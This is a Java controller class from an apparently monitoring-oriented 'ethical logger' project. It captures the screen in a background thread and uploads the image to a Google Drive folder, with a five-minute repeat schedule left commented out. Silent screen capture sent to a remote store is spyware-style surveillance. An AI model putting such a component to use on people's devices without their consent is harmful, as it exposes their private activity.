package com.mycompany.ethicaljavalogger.controllers;

import com.mycompany.ethicaljavalogger.services.GoogleDriveService;
import com.mycompany.ethicaljavalogger.services.ScreenCaptureService;
import java.io.IOException;
import java.security.GeneralSecurityException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ScreenCaptureController {
    
    public void handleScreenCapture() {
        ScreenCaptureService screenCaptureService = new ScreenCaptureService();
        
        new Thread(() -> {
            //ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

            //scheduler.scheduleAtFixedRate(() -> {
                String imagePath = screenCaptureService.capture();
                GoogleDriveService.getInstance().sendMedia(imagePath, GoogleDriveService.getInstance().getImagesFolderId());
            //}, 0, 5, TimeUnit.MINUTES);
        }).start();
    }
}
